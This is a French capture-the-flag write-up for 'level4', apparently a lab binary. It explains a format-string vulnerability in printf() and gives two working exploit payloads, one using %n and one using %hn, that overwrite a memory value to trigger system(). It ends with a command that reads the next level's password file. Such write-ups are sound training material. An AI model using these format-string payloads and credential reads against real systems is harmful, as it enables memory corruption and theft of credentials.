# level4 - Format String Exploitation Avancée

## Analyse du Programme

**Structure**
- Fonction `n()` contenant une comparaison avec `0x1025544`
- Variable à modifier à l'adresse `0x8049810`
- Appel à `printf()` vulnérable dans la fonction `p()`

**Points d'Intérêt**
- Valeur cible: `0x1025544` (16930116 en décimal)
- Comparaison critique: `cmp $0x1025544,%eax`
- Exécution de `system()` si la comparaison réussit

## Méthodes d'Exploitation

**Approche Simple**
```bash
(python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' ; cat) | ./level4
```

**Approche Optimisée**
```bash
(python -c 'print "\x12\x98\x04\x08" + "\x10\x98\x04\x08" + "%250d" + "%12$hn" + "%21570d" + "%13$hn"'; cat) | ./level4
```

L'approche optimisée:
1. Écrit `0x5544` à l'adresse `0x8049810`
2. Écrit `0x0102` à l'adresse `0x8049812`
3. Utilise `%hn` pour écrire 2 bytes à la fois

**Obtention du Flag**
```bash
cat /home/user/level5/.pass
```

Cette exploitation modifie la valeur en mémoire pour déclencher l'appel à `system()`.
